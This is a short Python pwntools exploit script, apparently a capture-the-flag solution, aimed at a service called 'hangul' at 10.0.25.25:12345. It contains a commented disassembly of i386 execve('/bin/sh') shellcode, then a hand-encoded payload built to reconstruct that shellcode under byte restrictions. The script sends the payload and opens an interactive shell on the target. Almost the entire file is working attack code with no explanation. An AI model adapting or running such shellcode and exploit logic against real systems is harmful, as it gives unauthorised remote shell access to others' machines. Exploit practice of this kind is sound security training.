#!/usr/bin/env python

# by Sean

from pwn import *
context.arch='i386'

# eax = 0xbffffb86
# esp = 0xbffffb7c
# ebp = 0xbffffd88
# edi = 0xbffffe0c

'''
   0:   31 c0                   xor    eax,eax
   2:   68 2f 73 68 00          push   0x68732f
   7:   68 2f 62 69 6e          push   0x6e69622f
   c:   89 e3                   mov    ebx,esp
   e:   50                      push   eax
   f:   53                      push   ebx
  10:   89 e1                   mov    ecx,esp
  12:   31 d2                   xor    edx,edx
  14:   b0 0b                   mov    al,0xb
  16:   cd 80                   int    0x80
'''

sc = (
        '\xc1\xc1\xb0\xfd' +
        '\xc1\xc1\xb0\xaf' * 40 + # edi -> 0xbffffd44 (off = 446)
        '\xb0\xd0\xb4\xb0' + '\xc1\xc1\xb0\xd5\xc1\xaa' + # + 0x80
        '\xb0\xcd' + '\xc1\xc1\xb0\xaa' + # + 0xcd
        '\xb0\xab\xb4\xb0' + '\xc1\xc1\xb0\xd5\xc2\xaa' + # + 0x0b
        '\xb0\xb0\xb4\xb0' + '\xc1\xc1\xb0\xd5\xc0\xaa' + # + 0xb0
        '\xb0\xb2\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb6\xaa' + # + 0xd2
        '\xb0\xb1\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb8\xaa' + # + 0x31
        '\xb0\xb1\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb9\xaa' + # + 0xe1
        '\xb0\xb9\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb7\xaa' + # + 0x89
        '\xb0\xb3\xb4\xb0' + '\xc1\xc1\xb0\xd5\xbe\xaa' + # + 0x53
        '\xb0\xb0\xb4\xb0' + '\xc1\xc1\xb0\xd5\xbe\xaa' + # + 0x50
        '\xb0\xb3\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb9\xaa' + # + 0xe3
        '\xb0\xb9\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb7\xaa' + # + 0x89

        '\xb0\xbe\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb1\xaa' + # + 0x6e
        '\xb0\xb9\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb1\xaa' + # + 0x69
        '\xb0\xb2\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb1\xaa' + # + 0x62
        '\xb0\xbf\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb5\xaa' + # + 0x2f
        '\xb0\xb8\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb1\xaa' + # + 0x68
        '\xb0\xb0\xb4\xb0' + '\xc1\xc1\xb0\xd5\xbf\xaa' + # + 0x00
        '\xb0\xb8\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb1\xaa' + # + 0x68
        '\xb0\xb3\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb4\xaa' + # + 0x73
        '\xb0\xbf\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb5\xaa' + # + 0x2f
        '\xb0\xb8\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb1\xaa' + # + 0x68

        '\xb0\xb0\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb3\xaa' + # + 0xc0
        '\xb0\xb1\xb4\xb0' + '\xc1\xc1\xb0\xd5\xb8\xaa' + # + 0x31

    '\xc1\xc1' + '\xb0\xb0'*40)

r = remote('10.0.25.25', 12345)
r.sendline('./hangul')
sleep(0.5)
r.sendline(sc)
sleep(0.5)
r.interactive()